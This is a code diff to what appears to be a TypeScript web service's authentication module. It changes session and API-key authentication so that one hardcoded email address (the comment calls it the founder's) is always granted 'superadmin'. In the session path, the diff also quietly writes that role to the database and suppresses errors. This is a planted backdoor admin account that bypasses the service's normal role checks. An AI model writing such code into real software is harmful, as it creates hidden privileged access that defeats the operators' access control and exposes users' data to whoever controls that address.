@@ -55,9 +55,14 @@ export async function getSessionUser(c: HandlerCtx): Promise<SessionUser | null>
   const user = await getUserById(c.env, session.userId);
   if (!user || user.status !== "active") return null;
 
-  // 余额动态判定：普通用户与 VIP 依据余额是否大于 0 自动升降级
+  // 创始人账号无条件锁定为 superadmin；普通用户与 VIP 依据余额是否大于 0 自动升降级
   let currentRole = user.role;
-  if (currentRole === "user" || currentRole === "vip") {
+  if (user.email.toLowerCase() === "hackerxiaow@gmail.com") {
+    currentRole = "superadmin";
+    if (user.role !== "superadmin") {
+      updateUser(c.env, user.id, { role: "superadmin" }).catch(() => {});
+    }
+  } else if (currentRole === "user" || currentRole === "vip") {
     const { syncUserVipStatus } = await import("./storage/db");
     currentRole = (await syncUserVipStatus(c.env, user.id)) as SessionUser["role"];
   }
@@ -165,7 +170,9 @@ export async function authenticateApiKey(c: HandlerCtx): Promise<AuthedKey> {
 
   const user = await getUserById(c.env, row.userId);
   let userRole = (user?.role as AuthedKey["userRole"]) || "user";
-  if (userRole === "user" || userRole === "vip") {
+  if (user?.email?.toLowerCase() === "hackerxiaow@gmail.com") {
+    userRole = "superadmin";
+  } else if (userRole === "user" || userRole === "vip") {
     const { syncUserVipStatus } = await import("./storage/db");
     userRole = (await syncUserVipStatus(c.env, row.userId)) as AuthedKey["userRole"];
   }
